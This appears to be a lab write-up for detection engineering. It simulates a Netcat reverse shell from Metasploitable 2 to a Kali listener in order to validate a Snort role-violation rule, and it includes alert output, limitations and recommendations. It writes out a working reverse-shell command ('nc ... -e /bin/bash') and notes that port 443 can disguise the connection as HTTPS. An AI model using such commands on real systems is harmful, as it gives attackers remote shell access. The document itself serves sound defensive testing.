# MITRE ATT&CK: T1095 - Non-Application Layer Protocol / T1059.004 - Unix Shell
## Objective
Simulating a reverse shell connection from Metasploitable 2 back to Kali using Netcat, to test Snort detection rule sid:1000004, which is built around detecting a role-violation (a normally server-only host initiating outbound traffic) rather than matching on shell content.
## Environment
- Attacker: Kali (172.30.1.20)
- Victim: Metasploitable 2 (172.30.1.28)
- Listener port: 443 (arbitrary, chosen on both ends for this test)
- Tool used: Netcat
## Prerequisites
- Netcat on both Kali and Metasploitable
- Snort running with sid:1000004 active
- Listener must be in LISTEN state on Kali before the reverse shell is triggered, or the initial SYN from Metasploitable 2 would receive an immediate RST instead of completing the handshake
## What The Attack Does
A reverse shell flips the normal bind-shell roles, instead of the victim waiting for an inbound connection, the victim initiates an outbound connection to a listener controlled by the attacker. This exploits the typical default-deny on unsolicited inbound connections, and default-allow on outbound connections, on firewalls by making the connection look like routine outbound activity from the victim's side. In this lab, Metasploitable's normal role is server-only, and a reverse shell makes it briefly act as a client instead, which is what this detection is built to catch.
## Commands Used
- On Kali: `nc -lvnp 443`
- On Metasploitable (reverse shell): `nc 172.30.1.20 443 -e /bin/bash`
## Attacker Perspective
Once the listener was running on Kali and the reverse shell command was triggered on Metasploitable, the three-way handshake completed, giving Kali an interactive shell on Metasploitable. From the attacker's side, this connection looks identical to any other outbound client connection, there's no special behavior that distinguishes a reverse shell from an SSH client connecting out. Port 443 was chosen specifically to illustrate how an attacker might pick a commonly-allowed, outbound port to blend in with legitimate HTTPS traffic in logs or casual review.
## Defender Perspective
Snort output: ```[ 06/16-22:21:05.626949 [**] [1:1000004:1] REVERSE SHELL DETECTED [**] [Priority: 0] {TCP} 172.30.1.28:46547 -> 172.30.1.20:443 ]```
The alert fired on the ACK packet that completes the handshake before any shell command was typed or any data was exchanged. This confirmed that the rule is detecting the connection itself, not the shell content. The source port (46547) was a dynamically assigned ephemeral port, consistent with how any new outbound client connection gets its source port and confirms the rule's design not to use a specific source port, since it carries no fixed value to match against.
## Detection Validated
The rule fired once upon handshake completion, with no shell activity required to trigger it. As a second validation step, the  Detection 1 Hydra brute force was re-run against Metasploitable's FTP service while sid:1000004 was active, to confirm the rule wouldn't fire on unrelated traffic. Only sid:1000001 fired during that test and sid:1000004 stayed silent, confirming that Snort's "flow" keyword correctly distinguishes session roles (client/server, based on who sent the original SYN) rather than just raw IP packet direction, even when two different rules can see packets with identical source/destination IPs.
## Limitations Observed
Because the rule fires on connection establishment with no port restriction and no content match, it has no way to distinguish a real reverse shell from any other outbound TCP connection Metasploitable might make to Kali for an unrelated reason, in this lab it's an acceptable tradeoff because Metasploitable has no legitimate reason to ever initiate outbound traffic, but the same rule would be too broad in an environment where the "victim" host normally does make outbound connections. The choice of port 443 also showed that port-based camouflage works against human or casual log review, but has no effect on this rule, since the rule never uses a specific port number.
## Lessons Learned
This simulation required to think a different way then for Detections 1 and 2, since those relied on signature-based detection, while this one had no fixed signature to look for once the session was established. This led to the thinking of role-violation, with a host behaving outside its expected function. It also brought forward how Snort's "flow" keyword works that wasn't obvious before, "flow" tracks client/server roles based on who sent the original SYN, independently of which IP a given packet was traveling from at the header level. That was the key to confirming this rule wouldn't collide with the unrelated brute force alert, even though both rules can observe packets with the exact same source/destination IP pair.
## Recommendations
- Layer this detection with a SIEM capable of historical host-behavior baselining; ex: flagging that a host has never initiated outbound traffic before and has now started, which Snort has no mechanism to evaluate
- Treat this rule as lab-specific; a real-world version would need a better way to define "hosts that should never initiate outbound traffic" rather than hardcoding two known IPs
## References
- MITRE ATT&CK T1095: https://attack.mitre.org/techniques/T1095/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
- Snort Rule Documentation: https://docs.snort.org
